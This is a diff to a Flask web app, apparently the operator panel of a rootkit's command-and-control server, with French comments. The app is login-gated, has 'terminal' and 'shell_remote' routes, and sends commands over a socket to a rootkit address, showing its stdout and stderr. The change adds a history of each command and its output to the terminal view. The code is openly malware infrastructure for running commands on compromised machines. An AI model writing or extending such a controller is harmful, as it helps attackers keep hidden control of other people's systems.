@@ -33,6 +33,8 @@ rootkit_address = None
 last_response = ""
 authenticated = False
 connection_lock = threading.Lock()
+
+# Structure pour garder une trace des commandes et de leurs sorties
 command_history = []
 
 @app.route('/')
@@ -62,7 +64,7 @@ def dashboard():
 def terminal():
     if not authenticated:
         return redirect(url_for('login'))
-    return render_template("terminal.html", response=last_response)
+    return render_template("terminal.html", response=last_response, history=command_history)
 
 @app.route('/shell_remote', methods=['GET', 'POST'])
 def shell_remote():
@@ -154,7 +156,9 @@ def send():
     if not cmd:
         return redirect(url_for('terminal'))
 
-    command_history.append(cmd)
+    # Ajout de la commande dans l'historique
+    command_entry = {"command": cmd, "stdout": "", "stderr": ""}
+    command_history.append(command_entry)
 
     try:
         with connection_lock:
@@ -192,8 +196,16 @@ def send():
                         "stdout": stdout_content,
                         "stderr": stderr_content
                     }
+
+                    # Enregistrer la sortie dans l'historique
+                    command_entry["stdout"] = stdout_content
+                    command_entry["stderr"] = stderr_content
+
                 else:
                     last_response = {"stdout": response.strip(), "stderr": ""}
+                    command_entry["stdout"] = response.strip()
+                    command_entry["stderr"] = ""
+
             except socket.timeout:
                 last_response = {"stdout": "", "stderr": "⏱️ Le rootkit n'a pas répondu à temps."}
             finally:
@@ -201,7 +213,6 @@ def send():
 
     except Exception as e:
         last_response = {"stdout": "", "stderr": f"💥 Erreur : {e}"}
-
 
     return redirect(url_for('terminal'))
 
